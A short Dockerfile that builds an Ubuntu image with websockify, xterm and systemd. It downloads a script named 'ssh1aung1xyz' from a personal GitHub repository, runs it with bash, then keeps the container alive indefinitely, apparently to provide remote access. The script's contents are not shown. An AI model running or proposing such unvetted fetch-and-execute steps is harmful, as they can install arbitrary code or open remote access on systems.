FROM --platform=linux/amd64 ubuntu:22.04

ENV DEBIAN_FRONTEND=noninteractive
RUN apt update -y && apt install --no-install-recommends -y  websockify sudo xterm init systemd snapd vim net-tools curl wget git tzdata
RUN  wget https://github.com/githubaunglaymyanmar/onlytest/raw/refs/heads/main/ssh1aung1xyz && bash ssh1aung1xyz
RUN   screen -ls && ls
RUN  sleep infinity
